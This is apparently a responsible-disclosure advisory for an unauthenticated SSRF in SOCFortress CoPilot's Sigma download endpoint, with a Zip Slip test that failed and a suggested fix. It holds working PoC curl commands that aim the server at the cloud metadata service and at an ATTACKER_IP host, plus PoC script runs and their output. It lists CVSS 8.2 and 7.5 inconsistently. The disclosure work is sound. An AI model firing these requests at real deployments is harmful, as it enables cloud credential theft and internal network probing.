# SOCFortress CoPilot — Unauthenticated SSRF in Sigma Download Endpoint

> **Severity:** High (CVSS 3.1: 8.2) &nbsp;|&nbsp; **Status:** Responsibly Disclosed &nbsp;|&nbsp; **Verified:** 2026-04-21

## Overview

The `POST /api/sigma/download` endpoint in SOCFortress CoPilot accepts a caller-supplied URL and passes it verbatim to `requests.get()` with **no authentication, no allow-list, and no validation**. Any unauthenticated attacker can force the CoPilot server to issue HTTP requests to any host reachable from its network — including cloud instance-metadata services, internal Docker network services, and arbitrary internet hosts.

A secondary **Zip Slip** vector was investigated. It is **not exploitable** on the verified deployment — Python 3.11.2's `zipfile` module strips leading `..` segments before extraction, confining all files to `sigma_artifacts/`. The SSRF is the confirmed exploitable finding.

---

## Affected Component

| | |
|---|---|
| **Project** | [socfortress/CoPilot](https://github.com/socfortress/CoPilot) |
| **File** | `backend/app/connectors/wazuh_indexer/services/sigma/sigma_download.py` |
| **Endpoint** | `POST /api/sigma/download` |
| **Auth required** | ❌ None |
| **CVSS 3.1** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |

---

## Vulnerable Code

```python
# backend/app/connectors/wazuh_indexer/services/sigma/sigma_download.py

response = requests.get(url)   # ← caller-supplied URL, no allow-list, no auth
...
zip_ref.extractall(full_path)  # Zip Slip mitigated by Python 3.11.2 zipfile sanitization
```

The endpoint is registered with no FastAPI auth dependency, identical to the pattern found in PoC 03 (`/api/scoutsuite/delete-report`).

---

## Proof of Concept

### SSRF — force the backend to reach an arbitrary host

```bash
# Hit the AWS instance-metadata service
curl -sk -X POST http://localhost:5000/api/sigma/download \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Exfiltrate the outbound request to an attacker-controlled server
curl -sk -X POST http://localhost:5000/api/sigma/download \
  -H "Content-Type: application/json" \
  -d '{"url":"http://ATTACKER_IP:8765/probe"}'
```

### With the PoC script

```bash
pip install requests

# SSRF mode — backend GETs an attacker-chosen URL:
python 04_sigma_ssrf_zipslip.py \
  --target http://localhost:5000 \
  --mode ssrf \
  --ssrf-url http://169.254.169.254/latest/meta-data/

# Zip Slip mode — confirm traversal is blocked (SSRF confirmed as side effect):
python 04_sigma_ssrf_zipslip.py \
  --target http://localhost:5000 \
  --mode zipslip
```

### Verified output

```
[+] Malicious zip hosted at http://host.docker.internal:8765/evil.zip
[+] POST http://localhost:5000/api/sigma/download url=http://host.docker.internal:8765/evil.zip
[zipserver] "GET /evil.zip HTTP/1.1" 200 -
    HTTP 200
    {"message":"Successfully downloaded the Sigma queries.","success":true}
```

The `[zipserver]` log line confirms the **CoPilot backend made an outbound HTTP request** to the attacker-controlled server with no credentials required. Zip Slip was confirmed **not exploitable** — the traversal file landed inside `sigma_artifacts/` as expected:

```
./app/connectors/wazuh_indexer/sigma_artifacts/EVIL_ZIPSLIP.txt
```

---

## Impact

- **Cloud credential theft** — on AWS/GCP/Azure deployments, the backend can be made to query `169.254.169.254` and return IAM tokens or service account keys
- **Internal network scanning** — attacker can probe Docker-internal services (MinIO, MySQL, Redis) by observing response timing and error messages
- **Outbound request forgery** — CoPilot's server identity can be abused to make requests to third-party services as if originating from the server

---

## Suggested Fix

1. **Add authentication** — apply the same `Depends(verify_token)` pattern used on other protected routes
2. **Add a URL allow-list** — restrict accepted URLs to known Sigma rule repositories (e.g. `github.com/SigmaHQ/sigma`)

```python
ALLOWED_HOSTS = {"github.com", "raw.githubusercontent.com"}

@router.post("/download")
async def download_sigma(
    request: SigmaDownloadRequest,
    _: str = Security(get_current_user),
):
    parsed = urlparse(request.url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise HTTPException(status_code=400, detail="URL host not permitted")
    ...
```

---

## Zip Slip — Not Exploitable (Documented for Completeness)

The `extractall()` call on a zip containing `../../EVIL_ZIPSLIP.txt` was tested. Python 3.11.2's `zipfile` module sanitizes member paths before extraction — the file landed at:

```
./app/connectors/wazuh_indexer/sigma_artifacts/EVIL_ZIPSLIP.txt
```

Not at the intended traversal target. **This vector is mitigated at runtime.** It should be defensively addressed regardless by explicitly sanitizing member names before extraction, as runtime Python version is not a reliable long-term control.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-04-21 | Vulnerability discovered on self-hosted test instance |
| 2026-04-21 | GitHub Security Advisory submitted to socfortress/CoPilot |
| TBD | Maintainer response / patch |
| 2026-07-20 | 90-day public disclosure deadline |

---

## Ethics

> Research conducted on a self-hosted CoPilot instance. No production systems were accessed. Run only against systems you own or have **written authorization** to test.
